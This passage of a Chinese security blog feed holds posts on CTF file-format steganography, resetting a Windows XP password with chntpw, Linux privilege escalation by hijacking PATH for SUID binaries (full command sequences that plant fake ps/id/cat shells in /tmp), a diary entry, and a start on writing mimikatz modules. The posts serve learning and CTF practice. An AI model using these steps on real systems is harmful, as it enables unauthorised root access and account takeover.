数据流="">；实体定义如下。它必须以头部开始，头部后面接一个逻辑视屏实体，该实体要用其他规则来定义。最后，数据实体接结束符。数据实体后面的*表示数据实体可以在此位置出现0或多次。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Gif 数据流&gt; ::= 头部 &lt;；逻辑视屏&gt; &lt;；数据&gt;* 尾记录</span><br><span class="line">&lt;；逻辑视屏&gt; ::= 逻辑视屏描述块 [全局色表]</span><br><span class="line">&lt;；数据&gt; ::= &lt;；成象块&gt; |&lt;；特殊用途块&gt;</span><br><span class="line">&lt;；成象块&gt; ::= [图象控制扩充] &lt;；成象块&gt;</span><br><span class="line">&lt;；成象块&gt; ::= &lt;；基于表的图象&gt; |纯文本扩充</span><br><span class="line">&lt;；基于表的图象&gt; ::= 图象描述符 [局部色表] 图象数据</span><br><span class="line">&lt;；特殊用途块&gt; ::= 应用扩充 |注释扩充</span><br></pre></td></tr></table></figure></gif></p><p><img src="https://i.loli.net/2018/07/29/5b5d69773c0d7.jpg" alt="gif.jpg"></p><h4 id="mp3"><a href="#mp3" class="headerlink" title="mp3"></a>mp3</h4><p>mp3格式是在音频隐写中常见的一种格式,mp3即MPEG-a Audio Layer-3的简称，根据压缩质量和编码的复杂程度可以大致分为3层，分别对应与mp1,mp2,mp3,这三种有损压缩的声音文件，根据用途的不同，每层采用的编码方式也不同，其编码层次越高，编码器就越复杂，压缩率也高，一个mp3文件大致可以分成TAG_V2,Frame,TAG_V1三部分，其中frame是构成mp3的最小组成单位。<br>拿十三哥的音频来举个例子,使用audacity工具可以查看mp3的波形图,频谱图.<br><img src="https://i.loli.net/2018/07/28/5b5c612c4846e.jpg" alt="mp32.jpg"></p><p><img src="https://i.loli.net/2018/07/28/5b5c612c8f6ca.jpg" alt="mp3.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的话&quot;&gt;&lt;/a&gt;写在前面的话&lt;/h2&gt;&lt;p&gt;做了这么多的ctf比赛，告诉我个道理——再少不会少隐写！！！隐写题可是每次比赛都有的，But回顾过去，摸着自
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>艰难的kali破解xp开机密码之路</title>
    <link href="https://threst.github.io/2018/06/15/kali%E7%A0%B4%E8%A7%A3xp%E5%BC%80%E6%9C%BA%E5%AF%86%E7%A0%81/"/>
    <id>https://threst.github.io/2018/06/15/kali破解xp开机密码/</id>
    <published>2018-06-15T14:13:14.000Z</published>
    <updated>2018-06-15T14:30:58.014Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>今天一个妹子来找我，说开机密码忘记了，说是妹子其实根本没看见人——因为是他男朋友送电脑过来的，刺激！！</p><h2 id="win10pe初尝试"><a href="#win10pe初尝试" class="headerlink" title="win10pe初尝试"></a>win10pe初尝试</h2><p>拿到电脑那一刻，懵懂了，这哪是电脑，这根本就是十年前的古董啊！！病毒运行起来都卡，一大堆问题，本来是想直接用微pe盘破解（微pe真心好用），哪想这古董识别不了u盘</p><p>古董照片<br><img src="https://i.loli.net/2018/06/15/5b23c8cd36de6.jpg" alt=""></p><h2 id="kali大法好"><a href="#kali大法好" class="headerlink" title="kali大法好"></a>kali大法好</h2><p>正好威神那里有kali的启动盘，抱着试一试的想法插入了，啊！居然可以识别，直接设为u盘启动，开启kali<br>参考:<a href="https://blog.csdn.net/qq_31481187/article/details/52602454" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/52602454</a><br>先挂载windows的系统盘，打开终端，输入<br><code>cd /WINDOWS/system32/config</code></p><p>然后使用chntpw神器<br><code>chntpw -l SAM</code></p><p><img src="https://i.loli.net/2018/06/15/5b23c941d0cb6.jpg" alt=""></p><p>看见<code>Administrator</code>用户</p><p>输入：<br><code>chntpw -u Adminstrator SAM</code></p><p><img src="https://i.loli.net/2018/06/15/5b23c9a302c02.jpg" alt=""></p><p>要你选择<br><img src="https://i.loli.net/2018/06/15/5b23ca01d02bd.jpg" alt=""></p><h5 id="选择2解锁密码-最后退出的时候要需选择y，因为第一次选择1-退出输入n结果并没有改密码"><a href="#选择2解锁密码-最后退出的时候要需选择y，因为第一次选择1-退出输入n结果并没有改密码" class="headerlink" title="选择2解锁密码,最后退出的时候要需选择y，因为第一次选择1,退出输入n结果并没有改密码"></a>选择2解锁密码,最后退出的时候要需选择y，因为第一次选择1,退出输入n结果并没有改密码</h5><p>在输入<code>chntpw -u Adminstrator SAM</code>检查下<br><img src="https://i.loli.net/2018/06/15/5b23ca06ece30.jpg" alt=""><br>已经是blank了</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p><img src="https://i.loli.net/2018/06/15/5b23caf35f99e.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;今天一个妹子来找我，说开机密码忘记了，说是妹子其实根本没看见人——因为是他男朋友送电脑过来的，刺激！！&lt;/p&gt;
&lt;h2 id=&quot;win10p
      
    
    </summary>
    
    
      <category term="瞎记罢写" scheme="https://threst.github.io/tags/%E7%9E%8E%E8%AE%B0%E7%BD%A2%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>利用 PATH 环境变量进行 Linux 提权</title>
    <link href="https://threst.github.io/2018/06/06/%E5%88%A9%E7%94%A8%20PATH%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%BF%9B%E8%A1%8C%20Linux%20%E6%8F%90%E6%9D%83/"/>
    <id>https://threst.github.io/2018/06/06/利用 PATH 环境变量进行 Linux 提权/</id>
    <published>2018-06-06T03:13:14.000Z</published>
    <updated>2018-06-06T03:14:01.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="高考加油"><a href="#高考加油" class="headerlink" title="高考加油"></a>高考加油</h1><h2 id="写在前面的话"><a href="#写在前面的话" class="headerlink" title="写在前面的话"></a>写在前面的话</h2><p>在解决了几个OSCP挑战之后，我决定写一篇关于用于Linux提权方法的文章，这对我们的渗透测试项目很有帮助。在本文中，我们将学习“操纵$PATH变量的各种方法”，以获得远程主机的根访问权，以及CTF challenges用于提权的$PATH漏洞的技术。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>PATH是Linux和unix操作系统中的环境变量，它存储可执行程序的所有bin和sbin目录。当用户在终端上运行命令时，它对shell的请求是根据用户执行的命令在PATH变量的帮助下搜索可执行文件。超级用户通常还拥有/sbin和/usr/sbin条目，以便轻松执行系统管理命令。<br>使用echo命令查看用户路径。<br><code>echo $PATH</code><br>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</p><p>如果你注意到’.’在环境路径变量中，这意味着被记录的用户可以从当前目录执行二进制文件/脚本。</p><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>目前，我们在<code>/home/raj</code>目录中，我们将创建一个名称为<code>/script</code>的新目录。现在在脚本目录中，我们将编写一个小c程序来调用系统二进制文件的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">mkdir script</span><br><span class="line">cd /script</span><br><span class="line">nano demo.c</span><br></pre></td></tr></table></figure></p><p>你可以在我们的演示中看到我们的demo.c调用ps系统二进制文件命令。</p><p><img src="https://p3.ssl.qhimg.com/t0159f31c3f43ed523c.png" alt=""></p><p>然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o shell</span><br><span class="line">chmod u+s shell</span><br><span class="line">ls -la shell</span><br></pre></td></tr></table></figure></p><h3 id="受害者的机虚拟机"><a href="#受害者的机虚拟机" class="headerlink" title="受害者的机虚拟机"></a>受害者的机虚拟机</h3><p>首先，你需要破坏目标系统然后进入特权升级阶段。假设您通过ssh成功登录到受害者的机器。然后在查找命令的帮助下搜索具有SUID或4000权限的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>在上面的命令的帮助下，攻击者可以枚举任何可执行文件，这里我们还可以观察/home/raj/script/shell具有suid权限。</p><p><img src="https://p4.ssl.qhimg.com/t0144143a89451f6dbe.png" alt=""></p><p>然后我们进入/home/raj/script并看到一个可执行文件“shell”。我们运行这个文件，它看起来像正在运行ps，这是进程状态的一个真正的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure><h4 id="Echo-Command"><a href="#Echo-Command" class="headerlink" title="Echo Command"></a>Echo Command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><h4 id="Copy-Command"><a href="#Copy-Command" class="headerlink" title="Copy Command"></a>Copy Command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script/</span><br><span class="line">cp /bin/sh /tmp/ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">./shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="https://p0.ssl.qhimg.com/t018dafa3066188fc2b.png" alt=""></p><h4 id="Symlink-command"><a href="#Symlink-command" class="headerlink" title="Symlink command"></a>Symlink command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ln -s /bin/sh ps</span><br><span class="line">export PATH=.:$PATH</span><br><span class="line">./shell</span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p>注意:符号链接也被称为符号链接，如果该目录具有完整的权限，它将成功地工作。在Ubuntu中，对于符号链接，我们给了/script目录的权限777。<br>因此，我们看到攻击者可以操纵环境变量路径来升级特权并获得根访问。</p><p><img src="https://p2.ssl.qhimg.com/t0111f758ef0283c98a.png" alt=""></p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>重复上述步骤来配置您自己的环境中，我们将编写一个小c程序来调用系统二进制文件的功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br><span class="line">mkdir script</span><br><span class="line">cd /script</span><br><span class="line">nano demo.c</span><br></pre></td></tr></table></figure></p><p>你可以在我们的demo.c正在调用id命令–它是系统二进制文件。</p><p><img src="https://p2.ssl.qhimg.com/t01372b3e8a96e1ca86.png" alt=""></p><p>然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o shell2</span><br><span class="line">chmod u+s shell2</span><br><span class="line">ls -la shell2</span><br></pre></td></tr></table></figure></p><h3 id="受害者的虚拟机"><a href="#受害者的虚拟机" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再一次，你需要破坏目标系统然后进入特权升级阶段。假设您通过ssh成功登录到受害者的机器。然后在查找命令的帮助搜索具有SUID或4000权限的文件。在这里，我们还可以观察/home/raj/script/shell2具有suid权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>然后我们进入/home/raj/script，并看到一个可执行文件“shell2”。我们运行这个文件，它看起来像正在运行id。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script</span><br><span class="line">ls</span><br><span class="line">./shell2</span><br></pre></td></tr></table></figure><p><img src="https://p5.ssl.qhimg.com/t01239db93de93649fa.png" alt=""></p><h4 id="Echo-command"><a href="#Echo-command" class="headerlink" title="Echo command"></a>Echo command</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; id</span><br><span class="line">chmod 777 id</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell2</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p><img src="https://p0.ssl.qhimg.com/t01a9cb63912ec42e4b.png" alt=""></p><h2 id="Method-3"><a href="#Method-3" class="headerlink" title="Method 3"></a>Method 3</h2><p>重复以上步骤，设置您自己的环境确保我们的demo.c文件可以调用cat命令从内部读取内容etc/passwd文件。然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o raj</span><br><span class="line">chmod u+s raj</span><br><span class="line">ls -la raj</span><br></pre></td></tr></table></figure></p><p><img src="https://p4.ssl.qhimg.com/t013c40160a33742c61.png" alt=""></p><h3 id="受害者的虚拟机-1"><a href="#受害者的虚拟机-1" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再次破坏受害者的系统，然后转移到权限升级阶段，执行下面的命令来查看sudo用户列表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p><p>在这里，我们还可以观察/home/raj/script/raj具有suid权限，然后进入/home/raj/script并看到一个可执行文件“raj”。所以当我们运行这个文件时，它就会输出etc/passwd文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script/</span><br><span class="line">ls</span><br><span class="line">./raj</span><br></pre></td></tr></table></figure></p><h4 id="Nano-Editor"><a href="#Nano-Editor" class="headerlink" title="Nano Editor"></a>Nano Editor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">nano cat</span><br></pre></td></tr></table></figure><p>现在在终端输入/bin/bash当并保存它。</p><p><img src="https://p3.ssl.qhimg.com/t01799ac7f0d1dad684.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 cat</span><br><span class="line">ls -al cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./raj</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></p><p><img src="https://p0.ssl.qhimg.com/t014ee07fb0f0ed221c.png" alt=""></p><h2 id="方法4"><a href="#方法4" class="headerlink" title="方法4"></a>方法4</h2><p>重复以上步骤，设置您自己的环境确保我们的demo.c文件可以调用cat命令来读取msg.txt是在/home/raj里面,但是/home/raj里面没有这样的文件,然后使用gcc编译demo.c文件并将SUID权限提升到已编译文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br><span class="line">gcc demo.c -o ignite</span><br><span class="line">chmod u+s ignite</span><br><span class="line">ls -la ignite</span><br></pre></td></tr></table></figure><p><img src="https://p4.ssl.qhimg.com/t01815bb5d1b2aff4ec.png" alt=""></p><h3 id="受害者的虚拟机-2"><a href="#受害者的虚拟机-2" class="headerlink" title="受害者的虚拟机"></a>受害者的虚拟机</h3><p>再次损害受害者的系统，然后转移到特权升级阶段，并执行下方命令以查看sudo用户列表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure></p><p>在这里，我们还可以观察/home/ raj/script/拥有suid权限，然后我们进入/home/raj/script，看到一个可执行文件“ignite”。因此，当我们运行这个文件时，它会把一个错误“cat: /home/raj/msg.”txt”的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /home/raj/script</span><br><span class="line">ls</span><br><span class="line">./ignite</span><br></pre></td></tr></table></figure><h4 id="Vi-Editor"><a href="#Vi-Editor" class="headerlink" title="Vi Editor"></a>Vi Editor</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">vi cat</span><br></pre></td></tr></table></figure><p>现在在终端输入/bin/bash当并保存它。</p><p><img src="https://p2.ssl.qhimg.com/t01ba696306656a5c53.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 cat</span><br><span class="line">ls -al cat</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./ignite</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></p><p><img src="https://p3.ssl.qhimg.com/t018279fa8c54aceed2.png" alt=""><br>本文翻译:<a href="http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" rel="noopener">http://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;高考加油&quot;&gt;&lt;a href=&quot;#高考加油&quot; class=&quot;headerlink&quot; title=&quot;高考加油&quot;&gt;&lt;/a&gt;高考加油&lt;/h1&gt;&lt;h2 id=&quot;写在前面的话&quot;&gt;&lt;a href=&quot;#写在前面的话&quot; class=&quot;headerlink&quot; title=&quot;写在前面的
      
    
    </summary>
    
    
      <category term="安全客弃婴" scheme="https://threst.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A2%E5%BC%83%E5%A9%B4/"/>
    
  </entry>
  
  <entry>
    <title>常见文件格式分析</title>
    <link href="https://threst.github.io/2018/06/01/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/"/>
    <id>https://threst.github.io/2018/06/01/常见文件格式分析/</id>
    <published>2018-06-01T14:13:14.000Z</published>
    <updated>2018-06-01T14:32:07.045Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件格式概述"><a href="#文件格式概述" class="headerlink" title="文件格式概述"></a>文件格式概述</h1><p>文件格式实质上是信息的一种特殊的编码方式，计算机在存储信息时，由于信息种类的不同，所采取的文件格式也不同，在windows系统中，计算机通常采用扩展名的方式来区分不同的文件格式，ctf中考察文件格式大致分为4的类：</p><ul><li>文本格式：<code>.txt</code>,<code>.doc</code>,<code>.docx</code></li><li>图像格式：<code>.png</code>,<code>.jpg</code>,<code>bmp</code>,<code>.gif</code></li><li>音频格式:<code>.mp3</code>,<code>.wma</code>,<code>.wav</code></li><li>视频格式:<code>.mp4</code>,<code>.rmvb</code>,<code>.avi</code></li></ul><h3 id="txt格式"><a href="#txt格式" class="headerlink" title="txt格式"></a>txt格式</h3><p>txt即英文text的缩写，通常是指windows操作系统自带的一种纯文本文件格式</p><h3 id="doc-docx格式"><a href="#doc-docx格式" class="headerlink" title="doc/docx格式"></a>doc/docx格式</h3><p>doc即document的缩写，docx在doc的基础上加入了xml，通常是指Microsoft Office Word软件创建的文件格式，docx实际上是作为一个zip压缩方式的压缩文件，的哦出现相对doc体积更小，支持的对象更多，同常采用AOPR的工具爆破docx的难度更大</p><h3 id="png格式"><a href="#png格式" class="headerlink" title="png格式"></a>png格式</h3><p><code>89 50 4e 47 0d 0a 1a</code><br>属于无损压缩的位图格式，他采用LZ77的派生算法进行压缩，压缩比高，文件体积小，同时不损失颜色和数据，一个png文件可以由一个文件头标志和若干个数据块构成，而数据块有可以分为关键数据块和辅助数据块，每一类数据块又包含若干具体的数据块部分<br><img src="https://i.loli.net/2018/06/01/5b1158a6079eb.png" alt=""></p><p>wiki:<a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/png/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/picture/png/</a></p><h3 id="jpeg格式"><a href="#jpeg格式" class="headerlink" title="jpeg格式"></a>jpeg格式</h3><p>属于有损压缩的与平台无关的图像格式，jpeg的压缩比高(可高达100：1),png主要是块，而jpeg主要是以段的形式<br>wiki:<a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/jpg/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/picture/jpg/</a></p><h2 id="bmp格式"><a href="#bmp格式" class="headerlink" title="bmp格式"></a>bmp格式</h2><p>是windows的标准图像文件格式，通常情况下采用位映射存储格式，除了图像的深度(可以理解为控制色彩的能力)可选外，不采用任何其他的压缩方式，因此bmp的图像质量非常高，体积也非常大，bmp图像通常可以分为设备相关位图和设备无关位图两大类，一个bmp的文件格式通常由文件头，信息头，颜色信息和位图数据四部分组成<br>文件头:前面两个字节一般<code>42 4D</code>，随后4个字节表示位图大小,再后面4个字节为保留位设置为0,再后面的4个字节非常关键，表示文件头到位图数据的偏移量</p><h2 id="gif格式"><a href="#gif格式" class="headerlink" title="gif格式"></a>gif格式</h2><p>也是一种无损压缩，它存储的不是颜色的本身，而是该点的颜色列表的索引值，其内部分成许多存储快，可以用来存储多副图像或者是决定图像表现行为的控制块，继而实现动图和交互式应用，一个gif图像通常由文件头，gif数据流和文件终结器三个部分组成，目前常见的有87(不支持动图)和89两个版本<br>wiki:<a href="https://ctf-wiki.github.io/ctf-wiki/misc/picture/gif/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/misc/picture/gif/</a></p><h3 id="mp3"><a href="#mp3" class="headerlink" title="mp3"></a>mp3</h3><p>mp3即MPEG-a Audio Layer-3的简称，根据压缩质量和编码的复杂程度可以大致分为3层，分别对应与mp1,mp2,mp3,这三种有损压缩的声音文件，根据用途的不同，每层采用的编码方式也不同，其编码层次越高，编码器就越复杂，压缩率也高，一个mp3文件大致可以分成TAG_V2,Frame,TAG_V1三部分，其中frame是构成mp3的最小组成单位</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件格式概述&quot;&gt;&lt;a href=&quot;#文件格式概述&quot; class=&quot;headerlink&quot; title=&quot;文件格式概述&quot;&gt;&lt;/a&gt;文件格式概述&lt;/h1&gt;&lt;p&gt;文件格式实质上是信息的一种特殊的编码方式，计算机在存储信息时，由于信息种类的不同，所采取的文件格式也不同，在
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>61随想</title>
    <link href="https://threst.github.io/2018/06/01/61%E9%9A%8F%E6%83%B3/"/>
    <id>https://threst.github.io/2018/06/01/61随想/</id>
    <published>2018-06-01T14:13:14.000Z</published>
    <updated>2018-06-01T14:58:02.906Z</updated>
    
    <content type="html"><![CDATA[<p>今天是国际儿童节,可能每个人心里都住着一个孩子,动态朋友圈都是关于61礼物的,连室友都回长沙陪女朋友了,我就不一样了,买的内存和电脑都到了,装上之后确实不一样了,可以愉快的开虚拟机了!!其实今天还是大四的毕业晚会,想想三年之后就是我们了,现在还是这么菜,每天还是CTAL+V,还是要多看书,又想起高三的生活,转眼一年过去了,根据朋友圈的动态来分析,他们过的都还好,离2018高考也只有6天了,一起加油吧!<br><img src="https://i.loli.net/2018/06/01/5b115eb53507e.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天是国际儿童节,可能每个人心里都住着一个孩子,动态朋友圈都是关于61礼物的,连室友都回长沙陪女朋友了,我就不一样了,买的内存和电脑都到了,装上之后确实不一样了,可以愉快的开虚拟机了!!其实今天还是大四的毕业晚会,想想三年之后就是我们了,现在还是这么菜,每天还是CTAL+V
      
    
    </summary>
    
    
      <category term="瞎记罢写" scheme="https://threst.github.io/tags/%E7%9E%8E%E8%AE%B0%E7%BD%A2%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title>如何在MIMIKATZ添加模块</title>
    <link href="https://threst.github.io/2018/06/01/%E5%A6%82%E4%BD%95%E5%9C%A8MIMIKATZ%E6%B7%BB%E5%8A%A0%E6%A8%A1%E5%9D%97/"/>
    <id>https://threst.github.io/2018/06/01/如何在MIMIKATZ添加模块/</id>
    <published>2018-06-01T09:33:09.000Z</published>
    <updated>2018-06-01T14:47:58.943Z</updated>
    
    <content type="html"><![CDATA[<p>嗨，大家好 ！我今天要写关于“我怎样才能添加到模块到<code>mimikatz</code>中？”首先，你必须在github中克隆或<a href="https://github.com/gentilkiwi/mimikatz.git" target="_blank" rel="noopener">下载</a>。我使用Visual Studio Community 2015来打开该项目。</p><p>在尝试添加新模块之前，我们必须构建mimikatz项目。如果这里失败了，记得在下一次操作之前先修复你的开发环境。我试过了，结果成功了，让我们继续，我们在<code>/ mimikatz / modules</code>中创建自己的模块头和C文件，在这里：</p><pre><code>/mimikatz/modules/kuhl_m_littlePrince.c/mimikatz/modules/kuhl_m_littlePrince.h</code></pre><p><img src="https://p3.ssl.qhimg.com/t01a273e2c999bca5d0.jpg" alt=""><br>我将讨论在检查项目时使用的一些全局变量。了解它们的用途将有助于我们开发模块。比如全局变量<code>kuhl_m_littlePrince</code>＆ <code>kuhl_m_c_littlePrince</code>。<br>或这些类型的全局变量：<code>KUHL_M和KUHL_M_C</code>。<br><code>“KUHL_M”</code>表示Kiwi用户级高级模块。<br><code>KUHL_M</code>是由<code>kuhl_m.h</code>中的<code>“struct _KUHL_M”</code>定义的结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _KUHL_M &#123;</span><br><span class="line">    const wchar_t * shortName;  </span><br><span class="line">    const wchar_t * fullName;</span><br><span class="line">    const wchar_t * description;</span><br><span class="line">    const unsigned short nbCommands;</span><br><span class="line">    const KUHL_M_C * commands;</span><br><span class="line">    const PKUHL_M_C_FUNC_INIT pInit;</span><br><span class="line">    const PKUHL_M_C_FUNC_INIT pClean;</span><br><span class="line">&#125; KUHL_M, *PKUHL_M;</span><br></pre></td></tr></table></figure><p>在<code>kuhl_m.h</code>中定义的<code>struct KUHL_M</code>或<code></code> * PKUHL_M`，这个结构的参数为：</p><p>1.<code>shortName</code>用作模块名称，<br>2.<code>fullName</code>用于列出显示名称<br>3.描述用于描述模块<br>4.<code>nbcommand</code>用于命令的数量。<br>5.命令使用<code>KUL_M_C</code>中定义的模块函数列表<br>6.由于<code>“PKUHL_M_C_FUNC_INIT”</code>定义的名称是指<code>NTSTATUS</code>。<code>pInit</code>和<code>pClean</code>是<code>NTSTATUS</code>的变量类型。</p><p><code>PINIT＆pClean</code>功能不是强制性的，只是为了调用函数之前初始化模块，则当模块被卸载的原型为<code>PINIT＆pClean</code>相同：<code>NTSTATUS kuhl_m_modulename_init/clean()</code></p><p><code>“KUHL_M_C”</code>表示Kiwi用户级高级模块命令。</p><p><code>wchar_t</code>是“无符号短”。<code>PKUHL_M_C_FUNC</code>定义了一个类型为<code>“NTSTATUS”</code>的函数</p><figure class="highlight 